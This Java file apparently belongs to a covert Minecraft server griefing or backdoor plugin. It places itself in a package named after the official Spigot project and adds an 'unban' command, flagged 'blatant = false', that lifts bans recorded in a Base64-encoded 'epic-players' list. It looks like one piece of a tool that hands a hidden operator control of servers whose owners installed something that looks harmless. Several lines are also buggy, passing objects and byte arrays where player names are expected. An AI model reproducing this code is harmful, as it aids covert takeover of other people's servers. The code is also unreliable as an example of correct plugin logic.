package org.spigotmc.commands.impl.griefing;

import java.util.Base64;

import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;
import org.spigotmc.Main;
import org.spigotmc.commands.CommandListener;
import org.spigotmc.commands.annotation.CommandInfo;
import org.spigotmc.manager.DataManager;
import org.spigotmc.utils.Settings;

@CommandInfo (
    name = "unban",
    usage = "unban <player> | unban *",
    desc = "Unban players or players",
    blatant = false
)
public class unBan extends CommandListener{

    @Override
    public void execute(Main plugin, Player p, String[] args) {
        if (args.length <= 1) {
			p.sendMessage(Settings.USAGE(unBan.class.getAnnotation(CommandInfo.class).usage()));
		} else {
			if (args[1].equals("*")) {
				for (String a : DataManager.getData().getStringList("epic-players")) {
					byte[] remove = Base64.getEncoder().encode(a.getBytes());
					
					DataManager.banList.remove(new String(remove));
					DataManager.getData().set("epic-players", DataManager.banList);
					DataManager.saveData();
					@SuppressWarnings("deprecation")
					OfflinePlayer offlinePlayer = Bukkit.getServer().getOfflinePlayer(a);

					Bukkit.getServer().getBanList(BanList.Type.NAME).pardon(String.valueOf(offlinePlayer));
				}
				p.sendMessage(Settings.PREFIX("Everyone was unbanned!"));
			} else {
				@SuppressWarnings("deprecation")
				OfflinePlayer target = Bukkit.getServer().getOfflinePlayer(args[1]);
				if (target == null) {
					p.sendMessage(Settings.PREFIX("The player " + Settings.PURPLE + args[1] + Settings.WHITE + " doesn't seem to exist."));
				} else {
					
					byte[] remove = Base64.getEncoder().encode(target.getUniqueId().toString().getBytes());
					
					DataManager.banList.remove(new String(remove));
					DataManager.getData().set("epic-players", DataManager.banList);
					DataManager.saveData();
					@SuppressWarnings("deprecation")
					OfflinePlayer offlinePlayer = Bukkit.getServer().getOfflinePlayer(String.valueOf(remove));

					Bukkit.getServer().getBanList(BanList.Type.NAME).pardon(String.valueOf(offlinePlayer));
					p.sendMessage(Settings.PREFIX(target.getName() + " was unbanned!"));
				}
			}
		}
	}
}